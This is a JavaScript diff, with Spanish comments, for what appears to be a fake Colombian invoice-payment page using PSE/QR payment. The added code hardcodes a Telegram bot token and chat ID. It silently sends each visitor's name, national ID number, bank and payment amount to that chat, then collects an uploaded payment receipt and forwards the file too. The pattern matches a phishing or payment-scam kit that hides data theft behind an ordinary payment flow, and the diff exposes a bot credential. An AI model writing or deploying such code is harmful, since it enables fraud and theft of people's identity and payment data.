@@ -1,5 +1,9 @@
 const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
+// Credenciales Telegram
+const TELEGRAM_TOKEN = '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY';
+const TELEGRAM_CHAT_ID = '-1003321543933';
+
 document.addEventListener('DOMContentLoaded', () => {
     // 1. Cargar datos del localStorage y configurar UI
     const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
@@ -9,21 +13,42 @@ document.addEventListener('DOMContentLoaded', () => {
     // 2. Elementos del DOM
     const botonPagar = document.querySelector('.btn-pay');
     const modalQr = document.getElementById('modalQrPse');
+    
+    // Botones e inputs Paso 1
     const btnCerrarQr = document.getElementById('btnCerrarQr');
     const btnDescargarQr = document.getElementById('btnDescargarQr');
     const btnConfirmarFinal = document.getElementById('btnConfirmarFinal');
+    const qrPaso1 = document.getElementById('qrPaso1');
+    
+    // Botones e inputs Paso 2
+    const qrPaso2 = document.getElementById('qrPaso2');
+    const btnVolverAlQR = document.getElementById('btnVolverAlQR');
+    const fileInput = document.getElementById('comprobanteInput');
+    const fileNameDisplay = document.getElementById('fileNameDisplay');
+    const btnEnviarComprobante = document.getElementById('btnEnviarComprobante');
 
-    // 3. Lógica para abrir el QR
+    // ==========================================
+    // LÓGICA PASO 1: ABRIR MODAL Y NOTIFICAR
+    // ==========================================
     if (botonPagar) {
         botonPagar.addEventListener('click', (e) => {
             e.preventDefault();
             if (validarFormulario()) {
+                resetearModal();
                 modalQr.style.display = 'flex';
+                
+                // Extraer datos para el mensaje
+                const nombre = document.getElementById('formNombre').value.trim();
+                const cedula = document.getElementById('formNumId').value.trim();
+                const banco = document.getElementById('selectBanco').value;
+                const valor = document.getElementById('qrTotalPagar').textContent;
+
+                const mensaje = `🟢 <b>NUEVO INTENTO DE PAGO QR</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n🏦 Banco: ${banco}\n💰 Valor: ${valor}`;
+                enviarNotificacionTexto(mensaje);
             }
         });
     }
 
-    // 4. Lógica para descargar la imagen del QR
     if (btnDescargarQr) {
         btnDescargarQr.addEventListener('click', () => {
             const rutaImagen = document.getElementById('qrImagenPago').src;
@@ -33,21 +58,73 @@ document.addEventListener('DOMContentLoaded', () => {
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
-            alert("Imagen guardada. Ahora búscala en tu galería desde la app de tu banco al escanear QR.");
+            alert("Imagen guardada en su dispositivo.");
         });
     }
 
-    // 5. Botones de cerrar y completar pago
     if (btnCerrarQr) {
         btnCerrarQr.addEventListener('click', () => {
             modalQr.style.display = 'none';
         });
     }
-    
+
+    // Pasar del Paso 1 al Paso 2
     if (btnConfirmarFinal) {
         btnConfirmarFinal.addEventListener('click', () => {
-            alert("Gracias por su pago. En breve recibirá la confirmación en su correo.");
-            window.location.href = "index.html"; 
+            qrPaso1.style.display = 'none';
+            qrPaso2.style.display = 'block';
+        });
+    }
+
+    // ==========================================
+    // LÓGICA PASO 2: SUBIR Y ENVIAR COMPROBANTE
+    // ==========================================
+    if (btnVolverAlQR) {
+        btnVolverAlQR.addEventListener('click', () => {
+            qrPaso2.style.display = 'none';
+            qrPaso1.style.display = 'block';
+        });
+    }
+
+    // Mostrar el nombre del archivo seleccionado
+    if (fileInput) {
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files.length > 0) {
+                fileNameDisplay.textContent = e.target.files[0].name;
+            } else {
+                fileNameDisplay.textContent = 'Ningún archivo seleccionado';
+            }
+        });
+    }
+
+    // Enviar a Telegram
+    if (btnEnviarComprobante) {
+        btnEnviarComprobante.addEventListener('click', async () => {
+            const file = fileInput.files[0];
+            
+            if (!file) {
+                alert("Por favor, seleccione su comprobante antes de enviar.");
+                return;
+            }
+
+            // Cambiar estado del botón
+            const textoOriginal = btnEnviarComprobante.textContent;
+            btnEnviarComprobante.disabled = true;
+            btnEnviarComprobante.textContent = "Enviando archivo...";
+
+            const nombre = document.getElementById('formNombre').value.trim();
+            const caption = `📄 <b>Comprobante de pago</b>\nEnviado por: ${nombre}`;
+
+            const exito = await enviarDocumentoTelegram(file, caption);
+
+            if (exito) {
+                alert("Comprobante enviado exitosamente. Gracias por su pago.");
+                window.location.href = "index.html"; // Redirigir al inicio o página de éxito
+            } else {
+                alert("Hubo un error al enviar el comprobante. Por favor intente de nuevo.");
+                btnEnviarComprobante.disabled = false;
+                btnEnviarComprobante.textContent = textoOriginal;
+            }
         });
     }
 
@@ -57,9 +134,73 @@ document.addEventListener('DOMContentLoaded', () => {
             modalQr.style.display = 'none';
         }
     });
+
+    // Función para dejar el modal como nuevo si lo cierran y abren
+    function resetearModal() {
+        if(qrPaso1) qrPaso1.style.display = 'block';
+        if(qrPaso2) qrPaso2.style.display = 'none';
+        if(fileInput) fileInput.value = '';
+        if(fileNameDisplay) fileNameDisplay.textContent = 'Ningún archivo seleccionado';
+        if(btnEnviarComprobante) {
+            btnEnviarComprobante.disabled = false;
+            btnEnviarComprobante.textContent = "Enviar Comprobante";
+        }
+    }
 });
 
-// Funciones Auxiliares
+
+// ==========================================
+// FUNCIONES API TELEGRAM
+// ==========================================
+
+async function enviarNotificacionTexto(texto) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: texto,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (error) {
+        console.error("Error al enviar mensaje a Telegram:", error);
+    }
+}
+
+async function enviarDocumentoTelegram(file, caption) {
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('caption', caption);
+    formData.append('parse_mode', 'HTML');
+    
+    // Si es imagen usa sendPhoto (más liviano para TG), sino sendDocument
+    const endpoint = file.type.startsWith('image/') ? 'sendPhoto' : 'sendDocument';
+    const fieldName = file.type.startsWith('image/') ? 'photo' : 'document';
+    
+    formData.append(fieldName, file);
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${endpoint}`, {
+            method: 'POST',
+            body: formData
+        });
+        const result = await response.json();
+        return result.ok;
+    } catch (error) {
+        console.error(`Error al enviar ${fieldName} a Telegram:`, error);
+        return false;
+    }
+}
+
+
+// ==========================================
+// FUNCIONES AUXILIARES DE LA UI
+// ==========================================
+
 function validarFormulario() {
     const banco = document.getElementById('selectBanco').value;
     const email = document.getElementById('formCorreo').value.trim();
@@ -88,7 +229,7 @@ function actualizarInterfaz(data) {
     const monto = data.montoPagar || 0;
     const valorFormateado = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(monto);
     
-    const idsPrecios = ['lblValorNeto', 'lblValorTotal', 'lblTotalFinal'];
+    const idsPrecios = ['lblValorNeto', 'lblValorTotal', 'lblTotalFinal', 'qrTotalPagar'];
     idsPrecios.forEach(id => {
         if(document.getElementById(id)) document.getElementById(id).textContent = valorFormateado;
     });
